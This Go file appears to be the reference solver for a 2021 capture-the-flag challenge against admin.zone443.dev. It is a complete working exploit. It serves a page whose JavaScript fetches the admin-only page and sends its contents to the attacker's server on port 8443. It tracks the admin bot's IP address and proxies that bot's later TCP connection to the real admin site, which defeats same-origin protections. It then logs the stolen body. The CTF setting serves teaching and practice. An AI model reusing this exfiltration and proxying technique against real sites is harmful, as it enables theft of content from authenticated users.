// Copyright 2021 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Author: Kegan Thorrez

// The solve command runs the attack.
//
// Note that this might only work once, because after the first time the admin
// requests the HTML page, all requests from that IP won't get the HTML page
// anymore, they will be proxied. So to run the attack multiple times, restart
// this command between each run.
package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

const page = `<html>
<head>
<script>
fetch('/')
    .then(resp => resp.text())
    .then(text => fetch('https://${HOST}:8443/?body=' + encodeURIComponent(text)));
</script>
</head>
<body>
</body>
</html>`

var adminAddr = flag.String(
	"admin_addr",
	"admin.zone443.dev:443",
	"The host:port on which the admin site can be reached. The default value is fine if it's available. But if it's firewalled off, this needs to be changed to some localhost addr that is proxied to the admin site.")

var (
	adminIPMu sync.RWMutex
	adminIP   string
)

var mainServer *http.Server

type proxyListener struct {
	l *net.TCPListener
}

func isAdmin(conn *net.TCPConn) bool {
	ip, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		log.Printf("Bad conn.RemoteAddr(): %v", err)
		return false
	}

	adminIPMu.RLock()
	defer adminIPMu.RUnlock()
	return ip == adminIP
}

func tcpProxy(clientConn *net.TCPConn) {
	dstConn, err := net.Dial("tcp", *adminAddr)
	if err != nil {
		log.Printf("Failed to dial admin site: %v", err)
		clientConn.Close()
		return
	}

	group := sync.WaitGroup{}
	group.Add(2)

	go func() {
		written, err := io.Copy(dstConn, clientConn)
		log.Printf("Done copying from clientConn to dstConn: %d, %v", written, err)
		group.Done()
	}()

	go func() {
		written, err := io.Copy(clientConn, dstConn)
		log.Printf("Done copying from dstConn to clientConn: %d, %v", written, err)
		group.Done()
	}()

	group.Wait()
	clientConn.Close()
	dstConn.Close()
}

func (l *proxyListener) Accept() (net.Conn, error) {
	conn, err := l.l.AcceptTCP()
	if err != nil {
		log.Printf("Error accepting: %v", err)
		return nil, err
	}

	if isAdmin(conn) {
		go tcpProxy(conn)
		// This attack only needs to proxy 1 admin TCP connection. So stop listening after getting
		// that 1 connection to avoid leaks.
		return nil, errors.New("got an admin connection to proxy, so stopping listening")
	}

	return conn, nil
}

func (l *proxyListener) Close() error {
	return l.l.Close()
}

func (l *proxyListener) Addr() net.Addr {
	return l.l.Addr()
}

// Returns true if there's a simple body, otherwise returns empty string.
func getSimpleBody(req *http.Request) string {
	if req.TLS == nil {
		// It's unclear if this can ever happen.
		return "Error, there was no TLS.\n"
	}

	if len(req.TLS.PeerCertificates) == 0 {
		return "You are not logged in.\n"
	}

	// If there are multiple certificates, just take the first one, which is the leaf.
	// This is not expected to ever happen because we don't issue intermiate CA certs.
	user := req.TLS.PeerCertificates[0].Subject.CommonName

	if user == "" {
		// This should never happen, we don't issue certs with empty usernames.
		return "Error the username was empty.\n"
	}

	if user != "admin" {
		return "Hello, " + user + ". You are not the admin.\n"
	}

	return ""
}

func serveHTTP(resp http.ResponseWriter, req *http.Request) {
	log.Print("Got req")

	if req.URL.Path != "/" {
		log.Print("Bad path")
		http.NotFound(resp, req)
		return
	}

	body := getSimpleBody(req)
	if body != "" {
		log.Print(body)
		resp.Header().Set("Content-Type", "text/plain; charset=utf-8")
		resp.Header().Set("Content-Length", strconv.Itoa(len(body)))
		resp.WriteHeader(http.StatusOK)
		resp.Write([]byte(body))
		log.Print("Done responding with simple body")
		return
	}

	adminIPLocal, _, err := net.SplitHostPort(req.RemoteAddr)
	if err != nil {
		log.Printf("Bad RemoteAddr: %v", err)
		http.NotFound(resp, req)
		return
	}

	adminIPMu.Lock()
	if adminIP != "" {
		log.Fatalf("The admin contacted the server twice, that's unexpected. 1st: %s, 2nd: %s",
			adminIP,
			adminIPLocal)
	}
	adminIP = adminIPLocal
	log.Printf("Got adminIP: %v", adminIP)
	adminIPMu.Unlock()

	// This might be vulnerable to xss, but who cares
	body = strings.ReplaceAll(page, "${HOST}", req.Host)

	log.Printf("Sending main body with host %v", req.Host)
	resp.Header().Set("Content-Type", "text/html; charset=utf-8")
	resp.Header().Set("Content-Length", strconv.Itoa(len(body)))
	resp.Write([]byte(body))
	log.Print("Done responding with main body")
}

func report(resp http.ResponseWriter, req *http.Request) {
	body := req.FormValue("body") // The body query param
	log.Printf("REPORT BODY: %s", body)
	// Say not found in order to avoid making snoopers think something useful is here.
	http.NotFoundHandler().ServeHTTP(resp, req)
	if body != "" {
		// If we got a body, assume it was successful and shutdown immediately to avoid leaking anything
		// in the future.
		// This drastic exit might prevent the admin from getting the response, but that doesn't really
		// matter.
		log.Fatal("Quitting due to successful report")
	}
}

func clientCAPool() (*x509.CertPool, error) {
	caCertPem, err := ioutil.ReadFile("clientca.crt.pem")
	if err != nil {
		return nil, fmt.Errorf("Error reading clientca cert: %v", err)
	}
	caCertBlock, rest := pem.Decode(caCertPem)
	if caCertBlock == nil || len(rest) > 0 {
		return nil, fmt.Errorf("Error decoding clientca cert PEM block. caCertBlock: %v, len(rest): %d", caCertBlock, len(rest))
	}
	if caCertBlock.Type != "CERTIFICATE" {
		return nil, fmt.Errorf("clientca cert had a bad type: %s", caCertBlock.Type)
	}
	caCert, err := x509.ParseCertificate(caCertBlock.Bytes)
	if err != nil {
		return nil, fmt.Errorf("Error parsing clientca cert ASN.1 DER: %v", err)
	}
	cas := x509.NewCertPool()
	cas.AddCert(caCert)
	return cas, nil
}

func main() {
	flag.Parse()

	mainTCPListener, err := net.ListenTCP("tcp", &net.TCPAddr{IP: net.IPv4zero, Port: 443})
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}

	pListener := &proxyListener{l: mainTCPListener}

	clientCAPool, err := clientCAPool()
	if err != nil {
		log.Fatalf("Failed to create client CA pool: %v", err)
	}

	mainMux := http.NewServeMux()

	mainServer = &http.Server{
		Handler: mainMux,
		TLSConfig: &tls.Config{
			ClientAuth: tls.VerifyClientCertIfGiven,
			ClientCAs:  clientCAPool,
		},
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 14,
	}

	mainMux.HandleFunc("/", serveHTTP)

	reportMux := http.NewServeMux()

	reportServer := &http.Server{
		Addr:           ":8443",
		Handler:        reportMux,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 14,
	}

	reportMux.HandleFunc("/", report)

	group := sync.WaitGroup{}
	group.Add(2)

	go func() {
		log.Print("Going to serve main on 443")
		err := mainServer.ServeTLS(pListener, "server.fullchain.crt.pem", "server.key.pem")
		log.Printf("mainServer is done: %v", err)
		group.Done()
	}()

	go func() {
		log.Print("Going to serve report on 8443")
		err := reportServer.ListenAndServeTLS("server.fullchain.crt.pem", "server.key.pem")
		log.Printf("reportServer is done: %v", err)
		group.Done()
	}()

	group.Wait()
}
